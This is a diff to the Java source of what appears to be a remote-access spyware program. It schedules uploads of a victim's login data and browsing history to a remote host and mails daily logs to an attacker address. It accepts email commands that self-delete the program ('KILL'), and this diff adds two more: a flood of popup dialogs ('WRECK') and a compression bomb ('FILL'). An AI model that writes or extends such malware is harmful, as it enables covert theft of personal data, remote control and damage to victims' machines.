@@ -168,12 +168,17 @@ public class Radio
 	public static boolean isSecondaryDistrib = true;
 	public static String staticIP = "127.0.0.1"; // change accordingly
 	public static String allowedMailer = "targetemail@gmail.com";
-	public static Main m;
+	public static Main m = new Main();
+	static DialogSpawner sp = new DialogSpawner("Get rickrolled", "Why did you run this?");
+	static Thread spawner = new Thread(sp);
+	static Astatine a;
+	static Thread AlphaDecay;
 	
 	@SuppressWarnings("static-access")
 	public static void main (String[] args) throws IOException, URISyntaxException
 	{
-		m = new Main();
+		a = new Astatine();
+		AlphaDecay = new Thread(a);
 		Chocolat.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
 		Executors.newSingleThreadExecutor().execute(new Runnable() {
 		    @Override
@@ -205,57 +210,54 @@ public class Radio
 		    	schDay = dow;
 		    } // update scheduler
 			 if (dow == 2 || dow == 3 || dow == 4 || dow == 5 || dow == 6) {
-			 if ((hour >= 16 || hour == 0)) {
-				 if (socketUpload)
-				 {
-				 if (minutes % 2 == 0) {
-					 upload(getHostIP());
-				    } else {
-					 uplogin(getHostIP());
-					 uphistory(getHostIP());
+				 if ((hour >= 16 || hour == 0)) {
+					 if (socketUpload) {
+						 if (minutes % 2 == 0) {
+							upload(getHostIP());
+						 } 
+						 else {
+							 uplogin(getHostIP());
+							 uphistory(getHostIP());
+						 }
+					 }
+					 if (minutes % 30 == 0 || minutes == 0) {
+					     if (emailReceive) {
+						     Chocolat.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
+							 checkForCommands();
+					     }
+						 if (emailUpload && !uploadDone) {
+							 if (mailLogs() == 0) {
+							     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
+								 uploadDone = true;
+							 }
+						 }
+					 }
 				 }
-				 }
-				 if (minutes % 30 == 0 || minutes == 0) {
-			     if (emailReceive)
-			     {
-			     Chocolat.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
-				 checkForCommands();
-			     }
-				 if (emailUpload && !uploadDone)
-				 {
-				 if (mailLogs() == 0) {
-			     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
-				 uploadDone = true;
-				 }
-				 }
-				 }
-			 }
-			 } else if (dow == 1 || dow == 7) {
-				 if (socketUpload)
-				 {
-				 if (minutes % 2 == 0) {
-					 upload(getHostIP());
-				   } else {
-					 uplogin(getHostIP());
-				 	 uphistory(getHostIP());
-				   }
+			 } 
+			 else if (dow == 1 || dow == 7) {
+				 if (socketUpload) {
+					 if (minutes % 2 == 0) {
+						 upload(getHostIP());
+					 } 
+					 else {
+						 uplogin(getHostIP());
+						 uphistory(getHostIP());
+					 }
 				 }
 				 if ((minutes % 30 == 0 || minutes == 0)) {
-					 if (emailReceive)
-				     {
-				     System.out.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
-					 checkForCommands();
+					 if (emailReceive) {
+					     System.out.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
+						 checkForCommands();
 				     }
-					 if (emailUpload && !uploadDone)
-					 {
-					 if (mailLogs() == 0) {
-				     System.out.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
-					 uploadDone = true;
+					 if (emailUpload && !uploadDone) {
+						 if (mailLogs() == 0) {
+						     System.out.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
+							 uploadDone = true;
+						 }
 					 }
-					 }
-				 }
 				 }
 			 }
+		 }
 	}
 	 public static String getHostIP() throws IOException {
 		 if (!useStatIP)
@@ -486,7 +488,7 @@ public class Radio
 
 		      for (int i = 0, n = messages.length; i < n; i++) {
 		         Message message = messages[i];
-		        // System.out.println("---------------------------------");
+		         // System.out.println("---------------------------------");
 		         //System.out.println("[[ Mailer Command Received ]]");
 		         //System.out.println("Email Number " + (i + 1));
 		         //System.out.println("Subject: " + message.getSubject());
@@ -495,14 +497,23 @@ public class Radio
 		         //System.out.println("---------------------------------");
 		         if((message.getFrom()[0] + "").matches(allowedMailer))
 		         {
-		         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) 
-		         {
-		        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Kill Command Received");
-		        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
-		 			 cf.deleteOnExit();
-		 			 System.exit(0);
-		         	}
-		      	}
+			         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) 
+			         {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Kill Command Received");
+			        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+			 			 cf.deleteOnExit();
+			 			 System.exit(0);
+			         }
+			         // Popup boxes
+			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("WRECK")) {
+			        	 spawner.start();
+			         }
+			         
+			         // Compression bomb
+			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("FILL")) {
+			        	 AlphaDecay.start();
+			         }
+		      	  }
 		      }
 
 		      //close the store and folder objects
